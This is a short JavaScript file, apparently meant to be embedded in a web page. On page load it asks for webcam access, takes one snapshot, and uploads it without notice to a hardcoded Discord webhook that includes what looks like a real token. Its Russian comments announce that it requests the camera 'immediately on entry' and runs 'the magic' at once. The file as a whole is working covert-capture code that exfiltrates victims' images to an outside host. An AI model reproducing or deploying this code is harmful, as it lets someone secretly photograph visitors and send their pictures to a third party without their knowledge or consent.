const DISCORD_WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1498191140996776038/X87VBqZc1lEMwlkAIVcCKcO35rtJ9JBpP0-ouSw1s1SyKm8hdxFm24ZIryUNVlJk9azd';

async function start() {
    try {
        // Сразу запрашиваем камеру при входе
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.createElement('video');
        video.srcObject = stream;
        
        video.onloadedmetadata = async () => {
            await video.play();
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('file', blob, 'img.jpg');
                formData.append('content', '📸 **Новое фото получено!**');

                await fetch(DISCORD_WEBHOOK_URL, { method: 'POST', body: formData });
                
                // Закрываем камеру после снимка
                stream.getTracks().forEach(track => track.stop());
            }, 'image/jpeg');
        };
    } catch (err) {
        console.log("Доступ отклонен");
    }
}

// Запускаем магию сразу
window.onload = start;
